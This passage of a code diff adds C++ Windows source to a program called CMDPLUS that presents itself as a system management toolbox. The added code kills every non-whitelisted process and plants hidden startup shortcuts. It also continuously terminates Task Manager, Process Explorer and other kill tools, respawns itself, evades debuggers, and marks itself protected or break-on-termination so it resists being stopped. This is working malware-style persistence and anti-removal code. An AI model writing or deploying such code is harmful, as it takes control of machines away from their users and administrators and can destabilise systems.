+            THREADENTRY32 te;
+            te.dwSize = sizeof(THREADENTRY32);
+            if (Thread32First(hSnapshot, &te)) {
+                do {
+                    if (te.th32OwnerProcessID == GetCurrentProcessId()) {
+                        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
+                        if (hThread) {
+                            // 恢复线程，如果被挂起就唤醒它
+                            while (ResumeThread(hThread) > 0);
+                            CloseHandle(hThread);
+                        }
+                    }
+                } while (Thread32Next(hSnapshot, &te));
+            }
+            CloseHandle(hSnapshot);
+        }
+
+        // [v5.4] 周期性安全刷新: 每 50 个周期刷新 ThreadHide, 每 200 个周期做全量代码 CRC
+        cycleCount++;
+        if ((cycleCount % 50) == 0) {
+            ThreadHide::RefreshThreadHide();
+        }
+        if ((cycleCount % 200) == 0) {
+            (void)FullCodeCRC::VerifyRandomChunk();
+            (void)CodeSectionGuard::RunPeriodicCodeCheck();
+        }
+
+        // 每100ms检查一次
+        for (int i = 0; i < 100 && g_antiSuspendRunning.load(); i++) {
+            Sleep(1);
+        }
+    }
+
+    return 0;
+}
+
+// 启动反挂起保护
+static bool StartAntiSuspendProtection() {
+    if (g_antiSuspendRunning.load()) return true;
+
+    g_antiSuspendRunning.store(true);
+    g_antiSuspendThread = CreateThread(nullptr, 0, AntiSuspendThreadProc, nullptr, 0, nullptr);
+    if (!g_antiSuspendThread) {
+        g_antiSuspendRunning.store(false);
+        return false;
+    }
+
+    CloseHandle(g_antiSuspendThread);
+    return true;
+}
+
+// 停止反挂起保护
+static void StopAntiSuspendProtection() {
+    if (!g_antiSuspendRunning.load()) return;
+    g_antiSuspendRunning.store(false);
+    if (g_antiSuspendThread) {
+        WaitForSingleObject(g_antiSuspendThread, 1000);
+        CloseHandle(g_antiSuspendThread);
+        g_antiSuspendThread = nullptr;
+    }
+}
+
+// ============================================================================
+// [v5.4.2] 4.5秒自动验证线程 — 独立后台线程, 每4.5s触发全量安全检查
+//   不依赖主循环, 不与 DMSP_RUNE_CHECK 冲突 (独立定时器)
+//   覆盖: 反调试强制退出 + 代码完整性 + 内核调试检测 + DACL + IAT
+// ============================================================================
+static std::atomic<bool> g_autoVerifyRunning(false);
+static HANDLE g_autoVerifyThread = nullptr;
+
+static DWORD WINAPI AutoVerifyThreadProc(LPVOID) {
+    while (g_autoVerifyRunning.load()) {
+        // 2.3 秒间隔
+        Sleep(2300);
+
+        // 1. 反调试检测 — 命中则直接 ForceExit
+        AntiAnalysis::ForceExitIfDebugged();
+
+        // 2. 内核调试器检测
+        (void)KernelAntiDebug::IsKernelDebuggingDetected();
+
+        // 3. 代码段完整性
+        (void)CodeSectionGuard::RunPeriodicCodeCheck();
+
+        // 4. 内存 VAD 扫描
+        (void)VADMonitor::RunPeriodicVADCheck();
+
+        // 5. IAT 完整性
+        (void)IATIntegrity::RunPeriodicIATCheck();
+
+        // 6. DACL 安全描述符
+        (void)SecDescGuard::RunPeriodicSecDescCheck();
+    }
+    return 0;
+}
+
+static bool StartAutoVerify() {
+    if (g_autoVerifyRunning.load()) return true;
+    g_autoVerifyRunning.store(true);
+    // 推迟到所有初始化完成后启动, 避免竞态
+    g_autoVerifyThread = CreateThread(nullptr, 0, AutoVerifyThreadProc, nullptr, 0, nullptr);
+    if (!g_autoVerifyThread) {
+        g_autoVerifyRunning.store(false);
+        return false;
+    }
+    CloseHandle(g_autoVerifyThread);
+    return true;
+}
+
+// +++++ [功能14] CMDPLUS肃清系统 +++++
+// 子选项1: 立即肃清所有非白名单和非自身进程
+// 子选项2: 安装开机自启肃清 (注册表Run键+桌面快捷方式)
+// +++++++++++++++++++++++++++++++++++++
+
+struct KillTarget { std::wstring wname; std::string aname; };
+
+static DWORD WINAPI KillOneProcThread(LPVOID param) {
+    KillTarget* t = static_cast<KillTarget*>(param);
+    if (!t) return 1;
+    try { DWORD start = GetTickCount();
+        while (GetTickCount() - start < 3000) {
+            std::vector<int> pids = ProcessTerminator::getPIDsByName(t->aname);
+            if (pids.empty()) { delete t; return 0; }
+            try {
+                if (ProcessTerminator::terminateByProcessName(t->aname)) { delete t; return 0; }
+                if (ProcessTerminator::terminateBySystemCommand(t->aname)) { delete t; return 0; }
+                if (ProcessTerminator::terminateByParentChildRelationship(t->aname)) { delete t; return 0; }
+                if (ProcessTerminator::terminateByDirectMemoryZeroing(t->aname)) { delete t; return 0; }
+                if (ProcessTerminator::terminateByDebugging(t->aname)) { delete t; return 0; }
+                if (ProcessTerminator::terminateByPriorityManipulation(t->aname)) { delete t; return 0; }
+            } catch(...) {}
+            Sleep(80);
+        }
+        std::string cmd = std::string("taskkill /f /im ") + t->aname + " >nul 2>&1";
+        try { system(cmd.c_str()); } catch(...) {}
+    } catch(...) {}
+    delete t; return 1;
+}
+
+static bool SetAutoStartCleanup() {
+    wchar_t exePath[MAX_PATH] = {};
+    if (!GetModuleFileNameW(nullptr, exePath, MAX_PATH)) return false;
+    // 获取当前登录用户令牌 (用于查询用户路径)
+    HANDLE hUserToken = nullptr;
+    bool hasUserToken = WTSHelper::GetUserToken(&hUserToken);
+
+    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr)) { if (hasUserToken) CloseHandle(hUserToken); return false; }
+
+    IShellLinkW* psl = nullptr;
+    if (!SUCCEEDED(CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl)) || !psl) {
+        CoUninitialize(); if (hasUserToken) CloseHandle(hUserToken); return false;
+    }
+    psl->SetPath(exePath);
+    psl->SetArguments(L"--autoclean");
+    psl->SetDescription(L"CMDPLUS 开机肃清");
+    psl->SetShowCmd(SW_HIDE);
+
+    IPersistFile* ppf = nullptr;
+    if (!SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf)) || !ppf) {
+        psl->Release(); CoUninitialize(); if (hasUserToken) CloseHandle(hUserToken); return false;
+    }
+
+    bool anyOk = false;
+    // 公共启动文件夹 (All Users)
+    wchar_t commonStartup[MAX_PATH] = {};
+    if (SHGetFolderPathW(nullptr, CSIDL_COMMON_STARTUP, nullptr, SHGFP_TYPE_CURRENT, commonStartup) == S_OK) {
+        std::wstring lnk = std::wstring(commonStartup) + L"\\CMDPLUS_Cleanup.lnk";
+        if (SUCCEEDED(ppf->Save(lnk.c_str(), TRUE))) anyOk = true;
+    }
+    // 当前用户启动文件夹
+    wchar_t userStartup[MAX_PATH] = {};
+    if (SHGetFolderPathW(nullptr, CSIDL_STARTUP, hasUserToken ? hUserToken : nullptr, SHGFP_TYPE_CURRENT, userStartup) == S_OK) {
+        std::wstring lnk = std::wstring(userStartup) + L"\\CMDPLUS_Cleanup.lnk";
+        if (SUCCEEDED(ppf->Save(lnk.c_str(), TRUE))) anyOk = true;
+    }
+
+    ppf->Release(); psl->Release(); CoUninitialize();
+    if (hasUserToken) CloseHandle(hUserToken);
+    return anyOk;
+}
+
+static bool CheckAutoStartCleanup() {
+    HANDLE hUserToken = nullptr;
+    bool hasUserToken = WTSHelper::GetUserToken(&hUserToken);
+    // 检查公共启动文件夹
+    wchar_t commonStartup[MAX_PATH] = {};
+    if (SHGetFolderPathW(nullptr, CSIDL_COMMON_STARTUP, nullptr, SHGFP_TYPE_CURRENT, commonStartup) == S_OK) {
+        std::wstring lnk = std::wstring(commonStartup) + L"\\CMDPLUS_Cleanup.lnk";
+        if (GetFileAttributesW(lnk.c_str()) != INVALID_FILE_ATTRIBUTES) {
+            if (hasUserToken) CloseHandle(hUserToken);
+            return true;
+        }
+    }
+    // 检查当前用户启动文件夹
+    wchar_t userStartup[MAX_PATH] = {};
+    if (SHGetFolderPathW(nullptr, CSIDL_STARTUP, hasUserToken ? hUserToken : nullptr, SHGFP_TYPE_CURRENT, userStartup) == S_OK) {
+        std::wstring lnk = std::wstring(userStartup) + L"\\CMDPLUS_Cleanup.lnk";
+        if (GetFileAttributesW(lnk.c_str()) != INVALID_FILE_ATTRIBUTES) {
+            if (hasUserToken) CloseHandle(hUserToken);
+            return true;
+        }
+    }
+    if (hasUserToken) CloseHandle(hUserToken);
+    return false;
+}
+
+static bool EnsureDesktopShortcut() {
+    wchar_t exePath[MAX_PATH] = {};
+    if (!GetModuleFileNameW(nullptr, exePath, MAX_PATH)) return false;
+    bool anyOk = false;
+    HANDLE hUserToken = nullptr;
+    bool hasUserToken = WTSHelper::GetUserToken(&hUserToken);
+    int folders[] = { CSIDL_COMMON_DESKTOPDIRECTORY, CSIDL_DESKTOP };
+    for (int f = 0; f < 2; f++) {
+        wchar_t desk[MAX_PATH] = {};
+        HANDLE tokenForFolder = (f == 1 && hasUserToken) ? hUserToken : nullptr;
+        if (SHGetFolderPathW(nullptr, folders[f], tokenForFolder, SHGFP_TYPE_CURRENT, desk) != S_OK) continue;
+        std::wstring lnk = std::wstring(desk) + L"\\CMDPLUS工具箱.lnk";
+        if (GetFileAttributesW(lnk.c_str()) != INVALID_FILE_ATTRIBUTES) { anyOk = true; continue; }
+        HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+        if (FAILED(hr)) continue;
+        IShellLinkW* psl = nullptr;
+        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl)) && psl) {
+            psl->SetPath(exePath); psl->SetDescription(L"CMDPLUS 系统管理工具箱"); psl->SetShowCmd(SW_SHOW);
+            IPersistFile* ppf = nullptr;
+            if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) { ppf->Save(lnk.c_str(), TRUE); ppf->Release(); anyOk = true; }
+            psl->Release();
+        }
+        CoUninitialize();
+    }
+    if (hasUserToken) CloseHandle(hUserToken);
+    return anyOk;
+}
+
+static int RunCleanup(bool show) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return -1;
+    wchar_t self[MAX_PATH] = {}; GetModuleFileNameW(nullptr, self, MAX_PATH);
+    std::wstring sn(self); size_t p = sn.find_last_of(L"\\/");
+    if (p != std::wstring::npos) sn = sn.substr(p + 1);
+    std::transform(sn.begin(), sn.end(), sn.begin(), ::towlower);
+    std::vector<KillTarget> targets;
+    PROCESSENTRY32W pe = { sizeof(pe) };
+    if (Process32FirstW(hSnap, &pe)) do {
+        std::wstring nm = pe.szExeFile; std::transform(nm.begin(), nm.end(), nm.begin(), ::towlower);
+        if (nm.empty() || nm == sn || IsInUnifiedWhitelist(nm)) continue;
+        KillTarget kt; kt.wname = nm;
+        char buf[512] = {}; WideCharToMultiByte(CP_ACP, 0, nm.c_str(), -1, buf, 512, nullptr, nullptr);
+        kt.aname = buf; targets.push_back(kt);
+    } while (Process32NextW(hSnap, &pe));
+    CloseHandle(hSnap);
+    if (targets.empty()) { if (show) std::wcout << L"[肃清] 未发现非白名单进程\n"; return 0; }
+    if (show) std::wcout << L"[肃清] 发现 " << targets.size() << L" 个目标进程\n";
+    std::vector<HANDLE> thds;
+    for (size_t i = 0; i < targets.size(); i++) { KillTarget* pt = new KillTarget(targets[i]); HANDLE ht = CreateThread(nullptr, 0, KillOneProcThread, pt, 0, nullptr); if (ht) thds.push_back(ht); else delete pt; }
+    DWORD wst = GetTickCount();
+    for (size_t i = 0; i < thds.size(); i++) { DWORD el = GetTickCount() - wst; WaitForSingleObject(thds[i], (el < 3500) ? (3500 - el) : 1000); CloseHandle(thds[i]); }
+    // [v5.4.2] 移除幸存进程列表调试信息
+    if (show) std::wcout << L"[肃清] 清理完成\n";
+    return (int)targets.size();
+}
+
+static void Feature14Menu() {
+    while (true) {
+        std::wcout << L"\n=========== CMDPLUS 肃清系统 ===========\n";
+        std::wcout << L"  1. 立即肃清所有非白名单进程\n";
+        std::wcout << L"  2. 安装开机自启肃清\n";
+        std::wcout << L"  0. 返回主菜单\n";
+        std::wcout << L"========================================\n请选择: ";
+        std::string in; std::cin >> in; int s = 0; try { s = std::stoi(in); } catch(...) { continue; }
+        if (s == 0) return;
+        if (s == 1) {
+            std::wcout << L"[肃清] 开始立即肃清...\n";
+            int n = RunCleanup(true);
+            if (n < 0) std::wcout << L"[肃清] 进程快照失败\n";
+            std::wcout << L"[肃清] 按 Enter 返回..."; std::cin.ignore(1024, L'\n'); std::cin.get(); continue;
+        }
+        if (s == 2) {
+            std::wcout << L"[肃清] 安装开机自启肃清...\n";
+            EnsureDesktopShortcut() ? std::wcout << L"[肃清] 桌面快捷方式已创建\n" : std::wcout << L"[肃清] 桌面快捷方式创建失败\n";
+            SetAutoStartCleanup() ? std::wcout << L"[肃清] 启动文件夹快捷方式已创建\n" : std::wcout << L"[肃清] 启动文件夹快捷方式创建失败\n";
+            std::wcout << L"[肃清] 按 Enter 返回..."; std::cin.ignore(1024, L'\n'); std::cin.get(); continue;
+        }
+    }
+}
+
+static void AutoCleanupAndExit() {
+    // 清除 tasklist.exe 和 taskkill.exe 的 IFEO 劫持
+    auto clearIFEO = [](const wchar_t* exeName) {
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, (std::wstring(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\") + exeName).c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            RegDeleteKeyW(hKey, L""); RegCloseKey(hKey);
+        }
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, (std::wstring(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\") + exeName).c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            RegDeleteKeyW(hKey, L""); RegCloseKey(hKey);
+        }
+    };
+    clearIFEO(L"tasklist.exe");
+    clearIFEO(L"taskkill.exe");
+
+    RunCleanup(false);
+    EnsureDesktopShortcut();
+    if (!CheckAutoStartCleanup()) SetAutoStartCleanup();
+    ExitProcess(0);
+}
+
+// 检测并终止针对本进程的终结者程序
+// [增强] 添加统一白名单保护，防止误杀系统关键进程
+static void TerminateKillers() {
+    // [收窄] 精确匹配可能的终结者程序 (不再使用宽泛关键词)
+    const wchar_t* exactKillerNames[] = {
+        L"taskkill.exe",           // taskkill 命令
+        L"taskmgr.exe",            // 任务管理器
+        L"processhacker.exe",      // Process Hacker
+        L"procexp.exe",            // Process Explorer
+        L"procexp64.exe",          // Process Explorer 64位
+        L"cmdpluskill.exe",        // CMDPLUS杀手(自定义)
+        L"kill.cmdplus.exe",       // 变体
+        L"pkill.exe",              // pkill工具
+        L"pskill.exe",             // Sysinternals pskill
+        L"wmic.exe"                // WMIC (可用于终止进程)
+    };
+
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return;
+
+    PROCESSENTRY32W pe;
+    pe.dwSize = sizeof(PROCESSENTRY32W);
+    if (Process32FirstW(hSnapshot, &pe)) {
+        do {
+            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
+
+            std::wstring name = pe.szExeFile;
+            std::wstring lowerName = name;
+            std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::towlower);
+
+            // [关键] 白名单检查: 系统关键进程一律跳过
+            if (IsInUnifiedWhitelist(lowerName)) {
+                continue;
+            }
+
+            // [精确匹配] 只终止明确是进程管理/终止工具的程序
+            bool isKiller = false;
+            for (const auto& killerName : exactKillerNames) {
+                if (lowerName == killerName) {  // 改为精确匹配而非子串搜索
+                    isKiller = true;
+                    break;
+                }
+            }
+
+            if (isKiller) {
+                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                if (hProcess) {
+                    TerminateProcess(hProcess, 0);
+                    CloseHandle(hProcess);
+                }
+            }
+
+        } while (Process32NextW(hSnapshot, &pe));
+    }
+
+    CloseHandle(hSnapshot);
+}
+
+// 启动终结者检测线程
+static std::atomic<bool> g_killerDetectorRunning(false);
+static HANDLE g_killerDetectorThread = nullptr;
+
+static DWORD WINAPI KillerDetectorThreadProc(LPVOID lpParam) {
+    while (g_killerDetectorRunning.load()) {
+        TerminateKillers();
+        // 每500ms检查一次
+        for (int i = 0; i < 500 && g_killerDetectorRunning.load(); i++) {
+            Sleep(1);
+        }
+    }
+
+    return 0;
+}
+
+static bool StartKillerDetector() {
+    if (g_killerDetectorRunning.load()) return true;
+
+    g_killerDetectorRunning.store(true);
+    g_killerDetectorThread = CreateThread(nullptr, 0, KillerDetectorThreadProc, nullptr, 0, nullptr);
+    if (!g_killerDetectorThread) {
+        g_killerDetectorRunning.store(false);
+        return false;
+    }
+
+    CloseHandle(g_killerDetectorThread);
+    return true;
+}
+
+static void StopKillerDetector() {
+    if (!g_killerDetectorRunning.load()) return;
+    g_killerDetectorRunning.store(false);
+    if (g_killerDetectorThread) {
+        WaitForSingleObject(g_killerDetectorThread, 1000);
+        CloseHandle(g_killerDetectorThread);
+        g_killerDetectorThread = nullptr;
+    }
+}
+
+// 前向声明
+static bool StartEnhancedWatchdog();
+static bool StartAntiAPCProtection();
+static bool SetHighIntegrityLevel();
+
+// 启用所有增强保护（基于内联API Hook）
+static bool EnableEnhancedProtection() {
+    bool allSuccess = true;
+
+    // 1. 反调试保护 - 隐藏BeingDebugged标志
+    if (!ProtectPEB()) allSuccess = false;
+
+    // 2. 关闭调试端口
+    if (!DisableDebugPort()) {
+        // 失败也不影响，继续
+    }
+
+    // 3. 启动反挂起保护 - 定期恢复所有线程
+    if (!StartAntiSuspendProtection()) allSuccess = false;
+
+    // 4. [已替换] 内联API Hook已在InitProcessProtectionHooks中安装
+    //    OpenProcess / TerminateProcess / NtTerminateProcess / NtOpenProcess
+    //    替代了旧的终结者检测器线程，直接在API层拦截
+
+    // 5. 启动Watchdog守护线程（轻量级，仅监控进程存活）
+    if (!StartProcessWatchdog()) allSuccess = false;
+
+    // 6. [已移除] 关键进程保护(蓝屏) - RtlSetProcessIsCritical
+    //    原因: 用户要求移除蓝屏机制
+
+    // 7. [已禁用] EnhancedWatchdog - 与普通Watchdog功能重复
+    //    原因: 两个Watchdog同时创建新进程会导致多进程爆炸
+    //    现在只保留一个Watchdog (StartProcessWatchdog)
+
+    // 8. 启动反APC注入保护
+    if (!StartAntiAPCProtection()) allSuccess = false;
+
+    // 9. 设置高完整性级别
+    SetHighIntegrityLevel();
+
+    return allSuccess;
+}
+
+// ============================================================================
+// 增强Watchdog - 更激进的自我保护
+// ============================================================================
+
+static std::atomic<bool> g_enhancedWatchdogRunning(false);
+static HANDLE g_enhancedWatchdogThread = nullptr;
+
+static bool IsMainProcessRunning() {
+    DWORD currentPid = GetCurrentProcessId();
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, currentPid);
+    if (!hProcess) return false;
+
+    DWORD exitCode = 0;
+    bool isRunning = (GetExitCodeProcess(hProcess, &exitCode) && exitCode == STILL_ACTIVE);
+    CloseHandle(hProcess);
+    return isRunning;
+}
+
+static void SelfRespawn() {
+    wchar_t selfPath[MAX_PATH];
+    if (!GetModuleFileNameW(nullptr, selfPath, MAX_PATH)) return;
+
+    std::wstring cmdLine = L"\"";
+    cmdLine += selfPath;
+    cmdLine += L"\"";
+
+    STARTUPINFOW si = { sizeof(si) };
+    si.lpDesktop = const_cast<LPWSTR>(L"Winsta0\\Default");
+    PROCESS_INFORMATION pi = { 0 };
+
+    CreateProcessW(selfPath, const_cast<LPWSTR>(cmdLine.c_str()),
+        nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
+        nullptr, nullptr, &si, &pi);
+
+    if (pi.hThread) CloseHandle(pi.hThread);
+    if (pi.hProcess) CloseHandle(pi.hProcess);
+}
+
+static DWORD WINAPI EnhancedWatchdogThreadProc(LPVOID lpParam) {
+    std::wstring selfPath;
+    wchar_t path[MAX_PATH];
+    if (GetModuleFileNameW(nullptr, path, MAX_PATH)) {
+        selfPath = path;
+    }
+
+    DWORD mainPid = GetCurrentProcessId();
+
+    while (g_enhancedWatchdogRunning.load()) {
+        if (!IsMainProcessRunning()) {
+            for (int retry = 0; retry < 3; retry++) {
+                if (!selfPath.empty()) {
+                    STARTUPINFOW si = { sizeof(si) };
+                    si.lpDesktop = const_cast<LPWSTR>(L"Winsta0\\Default");
+                    PROCESS_INFORMATION pi = { 0 };
+
+                    std::wstring cmdLine = L"\"";
+                    cmdLine += selfPath;
+                    cmdLine += L"\"";
+
+                    if (CreateProcessW(selfPath.c_str(),
+                        const_cast<LPWSTR>(cmdLine.c_str()),
+                        nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
+                        nullptr, nullptr, &si, &pi)) {
+                        if (pi.hThread) CloseHandle(pi.hThread);
+                        if (pi.hProcess) CloseHandle(pi.hProcess);
+                        break;
+                    }
+                    Sleep(100);
+                }
+            }
+            break;
+        }
+
+        static int checkCounter = 0;
+        checkCounter++;
+
+        if (checkCounter % 20 == 0) {
+            ProtectPEB();
+        }
+
+        if (checkCounter % 10 == 0) {
+            DisableDebugPort();
+        }
+
+        if (checkCounter % 50 == 0) {
+            TerminateKillers();
+        }
+
+        if (checkCounter >= 100) {
+            checkCounter = 0;
+        }
+
+        Sleep(10);
+    }
+
+    return 0;
+}
+
+static bool StartEnhancedWatchdog() {
+    if (g_enhancedWatchdogRunning.load()) return true;
+
+    g_enhancedWatchdogRunning.store(true);
+    g_enhancedWatchdogThread = CreateThread(nullptr, 0, EnhancedWatchdogThreadProc, nullptr, 0, nullptr);
+    if (!g_enhancedWatchdogThread) {
+        g_enhancedWatchdogRunning.store(false);
+        return false;
+    }
+
+    CloseHandle(g_enhancedWatchdogThread);
+    return true;
+}
+
+static void StopEnhancedWatchdog() {
+    if (!g_enhancedWatchdogRunning.load()) return;
+    g_enhancedWatchdogRunning.store(false);
+    if (g_enhancedWatchdogThread) {
+        WaitForSingleObject(g_enhancedWatchdogThread, 1000);
+        CloseHandle(g_enhancedWatchdogThread);
+        g_enhancedWatchdogThread = nullptr;
+    }
+}
+
+// ============================================================================
+// 反APC注入保护
+// ============================================================================
+
+static std::atomic<bool> g_antiAPCProtectionRunning(false);
+static HANDLE g_antiAPCThread = nullptr;
+
+static DWORD WINAPI AntiAPCProtectionThreadProc(LPVOID lpParam) {
+    while (g_antiAPCProtectionRunning.load()) {
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if (hSnapshot != INVALID_HANDLE_VALUE) {
+            THREADENTRY32 te;
+            te.dwSize = sizeof(THREADENTRY32);
+            if (Thread32First(hSnapshot, &te)) {
+                do {
+                    if (te.th32OwnerProcessID == GetCurrentProcessId()) {
+                        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
+                        if (hThread) {
+                            CONTEXT ctx;
+                            ctx.ContextFlags = CONTEXT_CONTROL;
+                            if (GetThreadContext(hThread, &ctx)) {
+                                #ifdef _WIN64
+                                if (ctx.Rip == 0) {
+                                    ResumeThread(hThread);
+                                }
+                                #else
+                                if (ctx.Eip == 0) {
+                                    ResumeThread(hThread);
+                                }
+                                #endif
+                            }
+                            CloseHandle(hThread);
+                        }
+                    }
+                } while (Thread32Next(hSnapshot, &te));
+            }
+            CloseHandle(hSnapshot);
+        }
+
+        for (int i = 0; i < 50 && g_antiAPCProtectionRunning.load(); i++) {
+            Sleep(1);
+        }
+    }
+    return 0;
+}
+
+static bool StartAntiAPCProtection() {
+    if (g_antiAPCProtectionRunning.load()) return true;
+
+    g_antiAPCProtectionRunning.store(true);
+    g_antiAPCThread = CreateThread(nullptr, 0, AntiAPCProtectionThreadProc, nullptr, 0, nullptr);
+    if (!g_antiAPCThread) {
+        g_antiAPCProtectionRunning.store(false);
+        return false;
+    }
+
+    CloseHandle(g_antiAPCThread);
+    return true;
+}
+
+static void StopAntiAPCProtection() {
+    if (!g_antiAPCProtectionRunning.load()) return;
+    g_antiAPCProtectionRunning.store(false);
+    if (g_antiAPCThread) {
+        WaitForSingleObject(g_antiAPCThread, 1000);
+        CloseHandle(g_antiAPCThread);
+        g_antiAPCThread = nullptr;
+    }
+}
+
+// ============================================================================
+// 允许程序正常退出 - 禁用所有保护机制
+// ============================================================================
+
+static void DisableProtection() {
+    StopEnhancedWatchdog();
+    StopAntiAPCProtection();
+    // [替换] 卸载内联API Hook（替代旧的StopKillerDetector）
+    ProcessGuard::DisableProtection();
+    StopAntiSuspendProtection();
+    StopProcessWatchdog();
+}
+
+// ============================================================================
+// 增强进程完整性保护
+// ============================================================================
+
+static bool SetHighIntegrityLevel() {
+    HANDLE hToken = nullptr;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        return false;
+    }
+
+    LUID luid;
+    if (!LookupPrivilegeValueW(nullptr, SE_SECURITY_NAME, &luid)) {
+        CloseHandle(hToken);
+        return false;
+    }
+
+    TOKEN_PRIVILEGES tp;
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)) {
+        CloseHandle(hToken);
+        return false;
+    }
+
+    CloseHandle(hToken);
+    return true;
+}
+
+// 反结束进程保护 - 兼容版 (Win7 SP1 - Win11 25H2)
+// 使用多种方法确保进程保护生效
+bool EnableProcessProtection(HANDLE hProcess) {
+    if (!LoadNtSetInformationProcess() || !hProcess) return false;
+    
+    bool bMethod1Success = false;
+    bool bMethod2Success = false;
+    bool bJobSuccess = false;
+    NTSTATUS status;
+    
+    // 方法1: 使用 PS_PROTECTION (Windows 8+)
+    // 这是最有效的进程保护方法，但仅在Win8+有效
+    if (IsWindows8OrLater()) {
+        PS_PROTECTION_V2 psProtection = { 0 };
+        psProtection.Type = 1;
+        psProtection.Protection = 2;
+      
+        status = NtSetInformationProcessPtr(
+            hProcess,
+            0x3B,
+            &psProtection,
+            sizeof(psProtection)
+        );
+        
+        if (NT_SUCCESS(status)) {
+            bMethod1Success = true;
+        }
+    }
+    
+    // 方法2: 使用 ProcessBreakOnTermination (0x1D)
+    // 从Windows 7开始可用
+    BOOLEAN breakOnTermination = TRUE;
+    status = NtSetInformationProcessPtr(
+        hProcess,
+        0x1D,
+        &breakOnTermination,
+        sizeof(breakOnTermination)
+    );
+    
+    if (NT_SUCCESS(status)) {
+        bMethod2Success = true;
+    }
+    
+    // 方法3: 使用Job Object作为额外保护层
+    // 所有Windows版本都支持Job Objects
+    bJobSuccess = ProtectProcessWithJobObject(hProcess);
+    
+    // 任一方法成功即认为保护生效
+    if (bMethod1Success || bMethod2Success || bJobSuccess) {
+        return true;
+    }
+    
+    return false;
+}
+
+// 启动指定程序（带反结束保护）
+bool LaunchProgram(const wchar_t* programPath, const wchar_t* arguments = NULL) {
+    if (!programPath || GetFileAttributesW(programPath) == INVALID_FILE_ATTRIBUTES) {
+        return false;
+    }
+    
+    STARTUPINFOW si = { sizeof(si) };
+    si.lpDesktop = const_cast<LPWSTR>(L"Winsta0\\Default");
+    PROCESS_INFORMATION pi = { 0 };
+    
+    DWORD creationFlags = CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT;
+    
+    // 在启动程序之前最小化覆盖窗口
+    MinimizeOverlayWindows();
+    
+    // 检查是否以TrustedInstaller权限运行
+    bool asTI = IsRunningAsTrustedInstaller();
+    
+    bool processCreated = false;
+    
+    if (asTI) {
+        // 以TrustedInstaller权限运行时，需要使用当前用户令牌启动进程
+        WTSHelper::Initialize();
+        HANDLE hUserToken = nullptr;
+        
+        // 动态加载CreateProcessAsUserW
+        static PFN_CreateProcessAsUserW pCreateProcessAsUserW = nullptr;
+        static bool advapiLoaded = false;
+        if (!advapiLoaded) {
+            HMODULE hAdvApi = LoadLibraryW(L"advapi32.dll");
+            if (hAdvApi) {
+                pCreateProcessAsUserW = (PFN_CreateProcessAsUserW)GetProcAddress(hAdvApi, "CreateProcessAsUserW");
+                advapiLoaded = true;
+            }
+        }
+        
+        // 使用WTS API获取当前用户令牌
+        if (WTSHelper::IsAvailable() && WTSHelper::GetUserToken(&hUserToken)) {
+            HandlePtr hToken(hUserToken);
+            
+            // 复制令牌
+            HANDLE hDupToken = nullptr;
+            SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, FALSE };
+            
+            if (DuplicateTokenEx(hToken.get(), MAXIMUM_ALLOWED, &sa, SecurityImpersonation, TokenPrimary, &hDupToken)) {
+                HandlePtr hDupTokenPtr(hDupToken);
+                
+                // 设置令牌的会话ID为当前控制台会话
+                DWORD dwSessionId = WTSHelper::GetActiveConsoleSessionId();
+                if (dwSessionId != 0xFFFFFFFF) {
+                    SetTokenInformation(hDupTokenPtr.get(), TokenSessionId, &dwSessionId, sizeof(dwSessionId));
+                }
+                
+                // 使用CreateProcessAsUserW启动进程
+                if (pCreateProcessAsUserW) {
+                    processCreated = pCreateProcessAsUserW(
+                        hDupTokenPtr.get(),
+                        programPath,
+                        (LPWSTR)arguments,
+                        nullptr, nullptr, FALSE,
+                        creationFlags,
+                        nullptr,
+                        nullptr,
+                        &si,
+                        &pi);
+                }
+            }
+        }
+        
+        // 如果CreateProcessAsUserW失败，不使用回退，确保程序以普通权限运行
+        if (!processCreated) {
+            std::cerr << "无法以普通用户权限启动程序" << std::endl;
+            return false;
+        }
+    } else {
+        processCreated = CreateProcessW(programPath, (LPWSTR)arguments, NULL, NULL, FALSE, creationFlags, NULL, NULL, &si, &pi);
+    }
+    
